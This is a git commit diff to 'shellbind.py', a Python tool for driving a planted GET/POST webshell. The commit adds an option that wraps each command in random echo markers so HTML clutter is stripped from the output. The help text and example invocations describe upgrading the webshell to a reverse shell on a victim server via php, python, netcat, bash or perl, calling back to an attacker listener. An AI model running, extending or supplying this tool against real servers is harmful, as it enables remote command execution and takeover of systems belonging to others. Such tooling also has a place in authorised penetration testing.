aa39af6bba4c50799a2c09b03e2af7b301f76613
Sol/Hydr0nium <anonymous@example.com>
2023-07-04 23:00:20 +0200

    Added clean feature to remove junk from output

--- shellbind.py
+++ shellbind.py
@@ -9,6 +9,8 @@ import tty
 import time
 import os
 import multiprocessing
+import random
+import string
 
 # Parse Command Line Arguments
 parser = argparse.ArgumentParser(description="Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.", epilog="Examples:\n-Semi interactive shell (no cd, su, etc.)\n\tshellbind.py -X POST -p cmd -u http://vuln.example/shell.php\n-Fully interactive shell with verbose output\n\tshellbind.py -p cmd -u http://vuln.example/shell.py -v -r auto:10.10.13.37:8080", formatter_class=argparse.RawTextHelpFormatter)
@@ -20,7 +22,9 @@ parser.add_argument("-v", "--verbose", dest="debug", help="Verbose Output", acti
 parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.\nAvailable methods are:\n  auto - Try until a reverse shell binds\n  php - php reverseshell\n  py - python3 reverse shell with sockets\n  py2 - python2 reverse shell with sockets\n  nc1 - netcat reverse shell with -e flag\n  nc2 - netcat reverse shell with -c flag\n  bash - sh -i reverse shell\n  perl - perl reverse shell\nLHOST should be the ip that the victim can connect to\nThe port can be any unused port", metavar="METHOD:LHOST:PORT")
 parser.add_argument("--prefix", dest="prefix", help="Set a prefix that is send before every command in case of semi-interactive or once for the reverse shell if fully-interactive", default="")
 parser.add_argument("--postfix", dest="postfix", help="Set a postfix that is send after every command in case of semi-interactive or once for the reverse shell if fully-interactive", default="") 
+parser.add_argument("-c", "--clean", dest="clean", help="Clean output from trash like html (Does not work with Windows CMD)", action='store_true', default=False)
 args = parser.parse_args()
+
 
 # Initilized listener and start trying reverse shell payloads
 def init_upgraded_shell():
@@ -85,6 +89,7 @@ def back_call(payload_method, ip, port, payloads):
         except:
             pass
         print(f"[!] Method {payload_method} was not successfull")
+    print(f"[!] Could not call back")
 
 
 # Listens on given port and catches reverse shell. Then proceeds to upgrade it.
@@ -115,17 +120,35 @@ def web_shell():
         sys.exit()
     if args.debug:
         print("[!] Shellbind is ready. You can run commands now")
+
+
+
+    # This is used clean junk like html
+    upper_seq = ""
+    lower_seq = ""
+    command_upper = ""
+    command_lower = ""
+    if args.clean:
+        upper_seq = "".join([random.choice(string.ascii_uppercase) for x in range(16)])
+        lower_seq = "".join([random.choice(string.ascii_uppercase) for x in range(16)])
+        command_upper = "echo " + upper_seq + ";"
+        command_lower = "; echo " + lower_seq + ";"
+    # Command loop
     while True:
         try:
             command = input("$ ")
-            command = args.prefix + command + args.postfix
+            command = args.prefix + command_upper + command + command_lower + args.postfix
             if args.method == "GET":
                 params = {args.para_name: command}
                 res = requests.get(args.host, params=params)
             else:
                 params = {args.para_name: command}
                 res = requests.post(args.host, data=params)
-            print(res.text)
+            out = res.text
+            if args.clean:
+                out = out.split(upper_seq + "\n")[1]
+                out = out.split(lower_seq + "\n")[0]
+            print(out)
         except requests.ConnectionError:
             host = args.host.replace("\n", "")
             print(f"[!] Connection to {host} not possible")
